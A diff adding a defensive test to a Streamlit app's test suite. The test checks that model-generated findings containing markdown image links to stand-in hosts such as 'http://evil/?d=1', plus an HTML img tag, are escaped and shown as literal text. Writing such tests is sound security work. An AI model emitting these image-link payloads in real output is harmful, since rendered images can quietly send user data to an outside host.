@@ -1,3 +1,4 @@
+import re
 from io import BytesIO
 
 import pandas as pd
@@ -176,5 +177,21 @@ def test_deck_failure_shows_warning_and_page_still_renders(monkeypatch, tmp_path
         assert not at.exception
         assert any("Could not build the slide deck" in w.value for w in at.sidebar.warning)
         assert len(at.chat_input) == 1
+    finally:
+        st.cache_resource.clear()
+
+
+def test_model_text_is_rendered_literally_without_images(monkeypatch, tmp_path):
+    evil = Insight(finding="![x](http://evil/?d=1)", evidence=["<img src=x> [a](http://b)"],
+                   recommendation="**bold** ![y](http://evil2)")
+    try:
+        at, _ = run_app_with_stub(monkeypatch, tmp_path, insight=evil, errors=["![z](http://evil3)"])
+        assert not at.exception
+        values = [m.value for m in at.markdown] + [c.value for c in at.caption]
+        joined = "\n".join(values)
+        live = re.sub(r"\\.", "", joined)   # what is left once every backslash-escaped char is literal
+        assert "![" not in live and "](" not in live and "<" not in live
+        assert r"!\[x\]\(http://evil/?d=1\)" in joined
+        assert not at.get("imgs")
     finally:
         st.cache_resource.clear()
